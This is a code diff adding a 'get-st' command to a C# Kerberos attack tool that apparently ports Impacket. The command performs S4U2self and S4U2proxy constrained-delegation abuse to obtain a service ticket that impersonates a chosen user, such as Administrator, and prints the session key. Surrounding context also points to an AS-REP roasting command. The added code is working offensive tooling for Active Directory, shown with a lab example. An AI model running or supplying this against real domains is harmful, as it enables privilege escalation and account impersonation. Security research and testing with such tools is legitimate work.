@@ -2153,6 +2153,49 @@ switch (args[0])
         }
     }
 
+    case "get-st":
+    {
+        // getST.py (S4U / constrained delegation): a service account requests a ticket to itself on
+        // behalf of a user (S4U2self: PA-FOR-USER), then uses it as an additional-ticket to get a
+        // ticket to <target-spn> as that user (S4U2proxy). This is the abuse of the delegation that
+        // find-delegation enumerates; the point here is to put that S4U exchange on the wire.
+        if (args.Length < 7)
+        {
+            Console.Error.WriteLine("usage: get-st <dc-host> <service-user> <password> <domain-fqdn> <impersonate> <target-spn> [port]");
+            Console.Error.WriteLine("  e.g. get-st vm.lab.local websvc 'Pass123!' lab.local Administrator cifs/target.lab.local");
+            return 2;
+        }
+
+        string host = args[1];
+        string user = args[2];
+        string password = args[3];
+        string realm = args[4];
+        string impersonate = args[5];
+        string targetSpn = args[6];
+        int kdcPort = args.Length >= 8 ? int.Parse(args[7]) : 88;
+
+        try
+        {
+            Tgt tgt = KerberosClient.GetTgt(host, realm, user, password, kdcPort);
+            Console.WriteLine($"[*] TGT for {tgt.User}@{tgt.Realm} (etype {tgt.SessionKeyEtype})");
+
+            byte[] selfTicket = KerberosClient.GetS4u2SelfTicket(host, tgt, impersonate, kdcPort);
+            Console.WriteLine($"[*] S4U2self: ticket to self as '{impersonate}' ({selfTicket.Length} bytes) via PA-FOR-USER");
+
+            ServiceTicket st = KerberosClient.GetS4u2ProxyTicket(host, tgt, selfTicket, targetSpn, impersonate, kdcPort);
+            Console.WriteLine($"[+] S4U2proxy: service ticket for '{targetSpn}' impersonating '{impersonate}'");
+            Console.WriteLine($"    Ticket:      {st.Ticket.Length} bytes (encrypted with the target service key)");
+            Console.WriteLine($"    Session key: etype {st.SessionKeyEtype}, {st.SessionKey.Length} bytes" +
+                $" ({Convert.ToHexString(st.SessionKey).ToLowerInvariant()})");
+            return 0;
+        }
+        catch (Exception ex) when (ex is InvalidOperationException or InvalidDataException)
+        {
+            Console.Error.WriteLine($"[-] {ex.Message}");
+            return 1;
+        }
+    }
+
     case "get-npusers":
     {
         // GetNPUsers.py (AS-REP roasting): find accounts with "do not require Kerberos
